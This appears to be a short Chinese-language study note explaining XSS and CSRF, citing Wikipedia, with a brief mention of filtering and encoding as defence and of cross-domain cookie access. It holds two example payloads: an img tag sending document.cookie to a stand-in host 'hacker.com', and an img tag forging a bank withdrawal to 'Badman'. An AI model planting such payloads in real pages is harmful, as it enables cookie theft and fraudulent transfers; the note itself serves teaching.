title: XSS CSRF
---

#XSS
>参考
>https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC

跨网站脚本（Cross-site scripting，通常简称为XSS或跨站脚本或跨站脚本攻击）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。

###恶意代码是什么样子的?
例如有人在评论中输入了
```
<img src="http://www.hacker.com/xss/hacker.php?cookie=document.cookie" >
```
而有人浏览到了这个评论, 那么浏览器就会加载这个图片(发了请求), 那么他的Cookie就被发送出去了

###怎么做
通常是对用户输入和服务器输出到浏览器的数据进行检查，把一些敏感字符和特殊字符进行过滤或者编码。而对XSS漏洞进行防御。

#CSRF
>参考
>https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0
>http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html

跨站请求伪造（英语：Cross-site request forgery）
跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。

你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求

维基百科例子很明了
假如一家银行用以执行转账操作的URL地址如下： http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName

如果有账户名为Alice的用户访问了恶意站点，而这个恶意站点有这样的一个请求
```
<img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">
```

而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失1000资金。
(因为这个恶意站点上有一个请求时发往examplebank 的  浏览器会把用户examplebank的Cookie一起发过去)





###Cookie跨域访问
> 参考
> http://www.cnblogs.com/waters/articles/2869855.html
总的来说通过一些非常规的方式,  是可以做到b.com访问a.com下面的Cookie
